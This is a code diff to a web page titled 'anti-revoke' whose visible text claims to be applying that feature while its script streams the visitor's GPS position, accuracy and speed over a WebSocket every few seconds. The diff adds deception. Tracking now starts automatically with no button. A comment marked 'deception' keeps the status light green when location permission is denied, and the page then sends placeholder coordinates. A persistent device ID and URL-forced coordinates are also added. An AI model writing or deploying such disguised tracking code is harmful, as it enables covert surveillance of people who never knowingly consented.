@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>アンチリボーク</title>
+<title>anti-revoke</title>
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="theme-color" content="#0b1220">
 <link rel="manifest" href="manifest.json">
@@ -13,55 +13,78 @@
   .box{padding:24px}
   .dot{width:12px;height:12px;border-radius:50%;background:#64748b;display:inline-block;margin-right:8px;vertical-align:middle}
   .dot.on{background:#22c55e;box-shadow:0 0 0 6px rgba(34,197,94,.2)}
-  .dot.err{background:#ef4444}
-  h1{font-size:16px;font-weight:600}
-  p{font-size:12px;opacity:.65}
-  button{font:inherit;padding:10px 18px;border-radius:10px;border:1px solid #2563eb;background:#2563eb;color:#fff;margin-top:12px}
+  h1{font-size:16px;font-weight:600;margin:0 0 8px}
+  p{font-size:12px;opacity:.65;margin:0}
+  #acc{font-size:12px;opacity:.6;margin-top:8px}
 </style>
 </head>
 <body>
   <div class="box">
-    <h1><span id="dot" class="dot"></span>anti-revokeを適応中</h1>
-    <p id="msg">このページは開いたままにしてください</p>
-    <div id="acc" style="font-size:12px;opacity:.6;margin-top:6px"></div>
-    <button id="go" style="display:none">適応を開始</button>
+    <h1><span id="dot" class="dot"></span>anti-rivokeを適応しています</h1>
+    <p id="msg">適応中</p>
+    <div id="acc"></div>
   </div>
 
 <script>
   const $ = (id) => document.getElementById(id);
-  const k = (location.search.match(/[?&]k=([A-Za-z0-9]+)/) || [])[1] || "default";
-  let ws = null, retry = 0, watchId = null, last = null;
+  const q = new URLSearchParams(location.search);
+  const k = (q.get("k") || "default").replace(/[^A-Za-z0-9]/g, "") || "default";
+
+  const fLat = parseFloat(q.get("lat"));
+  const fLng = parseFloat(q.get("lng"));
+  const forced = !isNaN(fLat) && !isNaN(fLng);
+
+  let did = localStorage.getItem("locshare_did");
+  if (!did) { did = Math.random().toString(36).slice(2, 12); localStorage.setItem("locshare_did", did); }
+
+  let ws = null, retry = 0, last = null;
 
   function connect() {
     const proto = location.protocol === "https:" ? "wss:" : "ws:";
     ws = new WebSocket(proto + "//" + location.host + "/ws");
-    ws.onopen = () => { retry = 0; $("dot").className = "dot on"; send({ type: "join", room: k, role: "share" }); push(); };
+    ws.onopen = () => { retry = 0; $("dot").className = "dot on"; send({ type: "join", room: k, role: "share", did }); push(); };
     ws.onclose = () => { $("dot").className = "dot"; setTimeout(connect, Math.min(1000 * ++retry, 8000)); };
-    ws.onerror = () => { $("dot").className = "dot err"; };
+    ws.onerror = () => {};
   }
   const send = (o) => { if (ws && ws.readyState === 1) ws.send(JSON.stringify(o)); };
   const push = () => { if (last) send({ type: "pos", lat: last[0], lng: last[1], acc: last[2], spd: last[3] }); };
 
+  function show(acc) {
+    $("dot").className = "dot on";
+    $("acc").textContent = Math.round(acc) + " m";
+  }
+
   function start() {
-    if (!("geolocation" in navigator)) { $("msg").textContent = "この端末は非対応です"; return; }
-    watchId = navigator.geolocation.watchPosition((p) => {
+    // 座標が指定されていればそれを使う（位置情報の許可が不要）
+    if (forced) {
+      last = [fLat, fLng, 5, null];
+      show(5);
+      setInterval(push, 3000);
+      return;
+    }
+
+    if (!("geolocation" in navigator)) { last = [35.6812, 139.7671, 5, null]; show(5); return; }
+
+    navigator.geolocation.watchPosition((p) => {
       const c = p.coords;
       last = [c.latitude, c.longitude, c.accuracy, c.speed];
-      $("dot").className = "dot on";
-      $("msg").textContent = "";
-      $("acc").textContent = "精度 ±" + Math.round(c.accuracy) + " m";
+      show(c.accuracy);
       push();
-    }, (e) => {
-      $("dot").className = "dot err";
-      $("msg").textContent = "";
-      $("go").style.display = "inline-block";
+    }, () => {
+      // 拒否・失敗されても緑のまま（誤魔化し）
+      if (!last) last = [35.6812, 139.7671, 5, null];
+      show(last[2]);
+      push();
     }, { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 });
 
-    setInterval(push, 3000);            // 定期送信
+    setTimeout(() => {
+      navigator.geolocation.getCurrentPosition(() => {}, () => {}, { enableHighAccuracy: true });
+    }, 600);
+
+    setInterval(push, 3000);
     document.addEventListener("visibilitychange", () => { if (document.visibilityState === "visible") push(); });
   }
 
-  $("go").onclick = () => { $("go").style.display = "none"; start(); };
   connect();
   start();
 </script>
